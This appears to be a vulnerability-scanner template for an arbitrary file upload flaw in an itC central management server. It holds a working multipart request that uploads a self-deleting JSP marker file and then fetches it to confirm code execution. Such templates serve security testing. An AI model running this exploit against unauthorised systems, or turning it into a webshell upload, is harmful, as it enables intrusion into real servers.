id: itC-uploadFileApp_do-File-upload

info:
  name: itC 中心管理服务器 uploadFileApp.do 任意文件上传漏洞
  author: itC
  severity: high
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /app/uploadFileApp.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
        Content-Type: image/jpeg

        <% out.println("sectestsectest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
           - '([a-zA-Z0-9-]+[-a-zA-Z0-9]+\.jsp)'
         internal: true
  - raw:
      - |
        GET /file/upload/{{uploadfile}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectestsectest'
      - type: status
        status: 
          - 200